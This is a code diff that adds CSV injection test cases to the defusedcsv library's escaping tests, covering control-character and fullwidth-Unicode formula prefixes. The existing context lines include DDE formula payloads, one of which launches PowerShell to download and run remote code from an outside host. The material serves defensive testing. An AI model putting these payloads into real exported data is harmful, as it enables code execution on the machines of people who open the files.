@@ -13,6 +13,14 @@ from defusedcsv.csv import _escape as escape
     ("%1", "'%1"),
     ("|1+1", "'\\|1+1"),
     ("=1|2", "'=1\\|2"),
+    # https://owasp.org/www-community/attacks/CSV_Injection
+    ("\t=1+1", "'\t=1+1"),
+    ("\r=1+1", "'\r=1+1"),
+    ("\n=1+1", "'\n=1+1"),
+    ("\uff1d1+1", "'\uff1d1+1"),
+    ("\uff0b1+1", "'\uff0b1+1"),
+    ("\uff0d1+1", "'\uff0d1+1"),
+    ("\uff20SUM(A1)", "'\uff20SUM(A1)"),
     # https://blog.zsec.uk/csv-dangers-mitigations/
     ("=cmd|' /C calc'!A0", "'=cmd\\|' /C calc'!A0"),
     ("=cmd|' /C powershell IEX(wget 0r.pe/p)'!A0", "'=cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0"),
